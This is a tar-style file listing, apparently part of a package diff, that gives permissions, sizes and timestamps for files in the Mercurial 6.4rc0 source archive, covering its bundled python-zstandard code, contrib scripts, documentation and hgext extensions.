+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18152 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionreader.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10884 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionwriter.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6748 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressobj.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    45707 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressor.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7048 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressoriterator.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4761 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/constants.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18046 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressionreader.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9111 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressionwriter.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5427 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressobj.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    51907 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressor.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7385 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressoriterator.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4288 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/frameparams.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8819 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/python-zstandard.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7177 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/make_cffi.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3335 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/setup.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6048 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/setup_zstd.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/python-zstandard/tests/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5825 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/common.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5171 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_buffer_util.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    60810 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_compressor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29165 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_compressor_fuzzing.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9071 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_data_structures.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2962 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_data_structures_fuzzing.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    54630 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_decompressor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19315 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_decompressor_fuzzing.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      274 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_estimate_sizes.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1900 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_module_attributes.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2892 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/tests/test_train_dictionary.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/python-zstandard/zstandard/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2390 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstandard/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    83092 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstandard/cffi.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/python-zstandard/zstd/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18091 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/COPYING
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1530 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/LICENSE
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18345 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/bitstream.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5545 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/compiler.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4479 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/cpu.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1912 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/debug.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4960 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/debug.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9554 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/entropy_common.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2873 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/error_private.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2305 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/error_private.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33031 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/fse.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11202 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/fse_decompress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19952 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/huf.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14933 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/mem.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11059 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/pool.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2544 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/pool.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6667 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/pythoncapi_compat.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2819 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/threading.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5286 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/threading.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29099 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/xxhash.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12781 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/xxhash.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2673 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/zstd_common.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3751 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/zstd_errors.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12480 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/common/zstd_internal.h
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27542 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/fse_compress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8544 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/hist.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4504 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/hist.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32772 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/huf_compress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   172484 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    40937 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_internal.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5855 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_literals.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1224 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_literals.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19037 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1910 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19166 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_cwksp.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25278 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_double_fast.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1283 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_double_fast.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21936 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_fast.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1203 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_fast.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    51720 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_lazy.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2745 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_lazy.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23858 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_ldm.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3850 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_ldm.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    57582 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_opt.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2016 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_opt.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    92625 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstdmt_compress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9112 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstdmt_compress.h
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    50486 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/huf_decompress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8874 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_ddict.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1308 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_ddict.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    72690 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    56849 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2030 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6992 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress_internal.h
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11500 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1003 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff_common.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5334 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff_compress.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1919 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff_decompress.c
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    42155 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/cover.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4569 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/cover.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    54649 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/divsufsort.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2419 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/divsufsort.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    28051 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/fastcover.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43760 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/zdict.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17203 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/zdict.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   119972 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd/zstd.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9897 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/zstd.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4572 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python3-ratchet.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17216 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python3-whitelist
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6342 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/relnotes
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)    10429 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/revsetbenchmarks.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      853 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/setup-pytype.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      679 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/showstack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4007 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/simplemerge
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18553 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/synthrepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1581 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/tcsh_completion
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1955 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/tcsh_completion_build.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19926 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/testparseutil.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1403 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/undumprevlog
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/contrib/vagrant/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       80 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vagrant/README.md
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      415 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vagrant/Vagrantfile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      292 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vagrant/provision.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      314 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vagrant/run-tests.sh
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/contrib/vim/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      859 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vim/HGAnnotate.vim
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3533 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vim/hg-menu.vim
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    58353 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vim/hgcommand.vim
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1415 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vim/hgtest.vim
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4024 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vim/patchreview.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27369 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/vim/patchreview.vim
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/contrib/win32/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4670 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/win32/ReadMe.html
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      267 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/win32/buildlocal.bat
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      509 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/win32/hg.bat
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4885 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/win32/hgwebdir_wsgi.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2238 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/win32/mercurial.ico
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2416 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/win32/mercurial.ini
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      248 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/win32/postinstall.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1227 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/xml.rnc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    48881 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/zsh_completion
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/doc/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1475 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/Makefile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      416 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/README
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     6306 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/check-seclevel.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1920 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/docchecker
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)    11089 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/gendoc.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2489 2023-03-02 22:30:05.000000 mercurial-6.4rc0/doc/hg-ssh.8
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5003 2023-03-02 22:30:07.000000 mercurial-6.4rc0/doc/hg-ssh.8.html
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   487539 2023-03-02 22:30:06.000000 mercurial-6.4rc0/doc/hg.1
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   779093 2023-03-02 22:30:08.000000 mercurial-6.4rc0/doc/hg.1.html
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4995 2023-03-02 22:30:06.000000 mercurial-6.4rc0/doc/hgignore.5
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8114 2023-03-02 22:30:08.000000 mercurial-6.4rc0/doc/hgignore.5.html
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33848 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/hgmanpage.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   134509 2023-03-02 22:30:07.000000 mercurial-6.4rc0/doc/hgrc.5
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   197639 2023-03-02 22:30:08.000000 mercurial-6.4rc0/doc/hgrc.5.html
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1998 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/runrst
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5415 2023-03-02 22:29:51.000000 mercurial-6.4rc0/doc/style.css
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1708 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hg
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.198632 mercurial-6.4rc0/hgdemandimport/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2585 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgdemandimport/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5451 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgdemandimport/demandimportpy3.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1645 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgdemandimport/tracing.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1226 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgeditor
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       67 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    41869 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/absorb.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14438 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/acl.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2349 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/amend.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4171 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/automv.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3128 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/beautifygraph.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6906 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/blackbox.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3766 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/bookflow.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    42492 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/bugzilla.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3973 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/censor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2362 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/children.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7762 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/churn.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10723 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/clonebundles.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2717 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/closehead.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2404 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/commitextras.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/convert/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23862 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12483 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/bzr.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17626 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/common.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22644 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/convcmd.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11351 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/cvs.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36291 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/cvsps.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7837 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/darcs.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18068 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/filemap.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17697 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/git.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13259 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/gnuarch.py
